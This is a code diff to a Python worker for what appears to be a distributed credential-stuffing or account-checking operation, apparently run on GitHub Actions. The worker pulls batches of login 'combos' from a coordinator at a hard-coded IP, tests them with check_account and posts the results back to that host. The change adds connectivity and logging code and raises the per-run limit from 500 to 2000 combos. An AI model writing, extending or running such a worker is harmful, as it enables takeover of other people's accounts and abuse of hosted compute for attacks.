@@ -4,6 +4,7 @@ import time
 import asyncio
 import httpx
 import json
+import traceback
 from check_engine import check_account
 
 HOST = os.environ.get("COORDINATOR_HOST", "http://161.35.233.33:5000")
@@ -12,7 +13,7 @@ REPO = os.environ.get("GITHUB_REPOSITORY", "unknown")
 BATCH_SIZE = int(os.environ.get("BATCH_SIZE", "50"))
 CONCURRENCY = int(os.environ.get("CONCURRENCY", "50"))
 MAX_IDLE_ROUNDS = int(os.environ.get("MAX_IDLE_ROUNDS", "2"))
-MAX_COMBOS_PER_RUN = int(os.environ.get("MAX_COMBOS_PER_RUN", "500"))
+MAX_COMBOS_PER_RUN = int(os.environ.get("MAX_COMBOS_PER_RUN", "2000"))
 
 
 def safe_print(msg: str):
@@ -24,10 +25,21 @@ async def main():
     safe_print(f"[*] Coordinator: {HOST}")
     safe_print(f"[*] Max combos per run: {MAX_COMBOS_PER_RUN}")
 
+    safe_print(f"[*] Testing connectivity to {HOST}/ ...")
+    try:
+        async with httpx.AsyncClient(timeout=httpx.Timeout(10.0)) as test_client:
+            r = await test_client.get(f"{HOST}/")
+            safe_print(f"[+] Coordinator reachable! Status: {r.status_code} | Body: {r.text[:100]}")
+    except Exception as e:
+        safe_print(f"[-] CRITICAL: Cannot reach coordinator at {HOST}: {e}")
+        safe_print(f"[-] Worker aborting. Check host firewall and coordinator status.")
+        return
+
     async with httpx.AsyncClient(timeout=httpx.Timeout(30.0)) as client:
         try:
+            safe_print(f"[*] Registering worker...")
             r = await client.post(f"{HOST}/register", json={"worker_id": WORKER_ID, "repo": REPO})
-            safe_print(f"[*] Registered: {r.status_code}")
+            safe_print(f"[*] Registered: {r.status_code} | {r.text[:100]}")
         except Exception as e:
             safe_print(f"[-] Register failed: {e}")
 
@@ -40,11 +52,14 @@ async def main():
                 break
 
             try:
+                safe_print(f"[*] Fetching batch from {HOST}/get_task ...")
                 r = await client.post(f"{HOST}/get_task", json={"worker_id": WORKER_ID, "batch_size": BATCH_SIZE})
+                safe_print(f"[*] get_task status: {r.status_code}")
                 data = r.json()
                 combos = data.get("combos", [])
             except Exception as e:
                 safe_print(f"[-] get_task error: {e}")
+                traceback.print_exc()
                 await asyncio.sleep(5)
                 continue
 
@@ -81,6 +96,7 @@ async def main():
             total_checked += len(results)
 
             try:
+                safe_print(f"[*] Submitting {len(results)} results to {HOST}/submit ...")
                 r = await client.post(f"{HOST}/submit", json={"worker_id": WORKER_ID, "results": results})
                 safe_print(f"[+] Submitted {len(results)} | Total: {total_checked}/{MAX_COMBOS_PER_RUN} | HTTP {r.status_code}")
             except Exception as e:
